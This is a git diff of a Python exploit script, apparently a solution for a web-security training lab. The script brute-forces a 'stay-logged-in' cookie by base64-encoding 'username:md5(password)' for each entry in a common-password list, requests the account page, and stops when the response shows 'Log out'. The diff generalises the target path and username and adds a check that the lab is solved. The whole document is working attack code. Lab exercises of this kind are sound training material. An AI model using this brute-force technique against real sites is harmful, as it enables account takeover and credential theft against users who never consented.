@@ -18,27 +18,28 @@ headers = {
 }
 
 
-def bruteforce_password_hash(s, url):
-    carlos_acc_url = url + '/my-account?id=carlos'
-    passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')
-    for password in passwords:
+def bruteforce_password_hash(s, url, path, username, list_passwords):
+    target_url = url + path
+    for password in list_passwords:
         pass_md5 = hashlib.md5(password.encode()).hexdigest()
-        bytes_str = ('carlos:' + pass_md5).encode('utf-8')
+        bytes_str = (username + ':' + pass_md5).encode('utf-8')
         stay_cookie = base64.b64encode(bytes_str).decode('utf-8')
-
-        print(password, stay_cookie)
-
         cookies = { 'stay-logged-in': stay_cookie }
-        r = s.get(carlos_acc_url, headers=headers, cookies=cookies, allow_redirects=False)
+        r = s.get(target_url, headers=headers, cookies=cookies, allow_redirects=False)
         
         if r.status_code == 200 and 'Log out' in r.text:
             print('[+] Successful bruteforce carlos stay-logged-in cookie')
-            print(f'stay-logged-in: {stay_cookie}')
+            print(f'Stay-logged-in: {stay_cookie}')
             print(f'Password: {password}')
-            sys.exit()
-
-    print('[-] Don\'t find Carlos password in the list')
+            return password
+    print(f'[-] Not found {username} password in the list')
     sys.exit(-1)
+
+def check_solved_lab(s, url):
+    r = s.get(url)
+    if "Congratulations, you solved the lab!" in r.text:
+        print("[+] Successful solved lab")
+        sys.exit(0)
 
 def main():
     if len(sys.argv) != 2:
@@ -47,8 +48,15 @@ def main():
         sys.exit(-1)
 
     s = requests.Session()
-    url = sys.argv[1]
-    bruteforce_password_hash(s, url)
+    url = sys.argv[1].rstrip('/')
+
+    list_passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')
+
+    target_username = 'carlos'
+
+    bruteforce_password_hash(s, url, '/my-account', target_username, list_passwords)
+
+    check_solved_lab(s, url)
 
 if __name__ == '__main__':
     main()
